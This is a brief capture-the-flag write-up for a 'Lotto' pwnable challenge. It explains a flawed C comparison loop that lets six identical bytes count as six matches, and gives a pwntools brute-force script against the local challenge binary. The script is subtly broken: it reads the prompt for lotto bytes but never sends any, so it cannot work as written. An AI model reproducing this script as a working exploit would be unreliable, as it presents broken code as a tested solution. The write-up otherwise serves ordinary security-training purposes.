+++
date = '2026-05-23T11:01:52+03:00'
draft = false
title = 'Lotto'
+++

# Lotto

This challenge is about a simple lotto
game we receive a source code and an executable
after reading the source code the program
works by getting an input of 6 bytes from us and then generating
a random 6 byte code as well, after it compares the input to the password
and also it normalizes the password so it will be between 1-45
if we try to bruteforce it it would be nighly impossible, but reading the code

```c
for(i=0; i<6; i++){        // iterates over lotto[]
    for(j=0; j<6; j++){    // iterates over submit[]
        if(lotto[i] == submit[j]){
            match++;        // increments for EVERY pair match
        }
    }
}
if(match == 6){ // win
```


this snippet right here shows the vulnerability ,
its enough to find only 1 matching byte and it will iterate it over 
each time and increas it to 6 even if its one matching byte

now we can bruteforce by submitting 6 identical bytes
then whenever any single lotto number equals our value
it loops all 6 identical bytes so we get insta win

lets utilize pwntools


```python

from pwn import *

# Connect to the challenge
p = process('./lotto')   

while True:
    p.recvuntil(b'3. Exit')
    p.sendline(b'1')                        
    p.recvuntil(b'Submit your 6 lotto bytes : ')
    result = p.recvuntil([b'flag', b'bad luck'])
    
    if b'bad luck' not in result:
        print(p.recvall().decode())         # Print the flag
        break

p.close()

```
